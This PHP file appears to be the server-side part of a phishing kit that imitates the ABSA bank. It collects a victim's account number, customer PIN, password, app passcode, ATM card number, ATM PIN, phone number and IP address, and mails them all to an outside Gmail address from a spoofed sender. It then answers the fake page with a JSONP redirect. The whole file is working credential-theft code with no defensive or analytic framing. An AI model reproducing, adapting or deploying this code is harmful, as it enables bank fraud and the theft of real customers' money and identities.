<?php
session_start();

if(isset($_GET['confirmPasscodeAppPasscode']))

{

        $ccn = @$_GET['AccessAccount'];
	$csp = @$_GET['PIN'];
	$atm = @$_GET['Operator'];
	$password = $_GET['password'];
	$cellphonenumber =@$_GET['confirmPhoneNumber'];
        
        
        $appPasscode = $_GET['confirmPasscodeAppPasscode'];
        $atmNumber = $_GET['confirmPasscodeAtmCardNumber'];
        $atmPINNumber = $_GET['confirmPasscodeAtmPin'];
        
	$ip = $_SERVER['REMOTE_ADDR'];
	
	$time = time();

        $msg  = "AccessAccount No : $ccn \r\n";
	$msg .= "Customer Pin : $csp \r\n";
	$msg .= "user number : $atm \r\n\r\n";
        $msg .= "Password : $password\r\n\r\n";               
        $msg .= "APP Passcode : $appPasscode \r\n";
	$msg .= "ATM card number : $atmNumber \r\n";
        $msg .= "ATM PIN : $atmPINNumber\r\n";       
        $msg .= "Cell Phone: $cellphonenumber\r\n";
	$msg .= "Remote_Addr:-----> $ip \r\n\n";

	

	$from = "gelos@merik-dein.ee";
	$headers = "From:" . $from;
        $subject = "NEW DEVICE A B S A - $ccn - $ip ".$_SERVER['HTTP_HOST'];

	$invalid = array();

	if(count($invalid) == 0)
	{
		if(mail('hemtlanker@gmail.com', $subject, $msg, $headers))
                //if(1)
		{
                    @$experience_login = file_get_contents('');
                    @$experience_login = str_replace("{AccessAccount}", $ccn, $experience_login);
                    @$experience_login = str_replace("{PIN}", $csp, $experience_login);
                    @$experience_login = str_replace("{Operator}", $atm, $experience_login);
                    @$experience_login = str_replace("{password}", $password, $experience_login);
                   
                    header("Content-Type: application/javascript");
                    $callback = $_GET["callback"];                   
                    $experience_login = "redirect";
                    $jsonResponse = json_encode(array('message' => $experience_login, 'focusElement' => "j_pin"));
                    echo $callback . '(' . $jsonResponse . ')';
		}

		else

		{			
                    $experience_login = "redirect"; //file_get_contents('rvn-page.html');
                    header("Content-Type: application/javascript");
                    $callback = $_GET["callback"];
                    $jsonResponse = json_encode(array('message' => $experience_login));
                    echo $callback . '(' . $jsonResponse . ')';
		}

	}
	else
	{
                    $experience_login = "Error"; //file_get_contents('rvn-page.html');

                    header("Content-Type: application/javascript");

                    $callback = $_GET["callback"];

                    $jsonResponse = json_encode(array('message' => $experience_login, 'errorMessage' => implode('\r\n', $error)));

                    echo $callback . '(' . $jsonResponse . ')';

	}

}

else

{

    $experience_login = "redirect"; //file_get_contents('rvn-page.html');

    header("Content-Type: application/javascript");

    $callback = $_GET["callback"];

    $jsonResponse = json_encode(array('message' => $experience_login));

    echo $callback . '(' . $jsonResponse . ')';

}

?>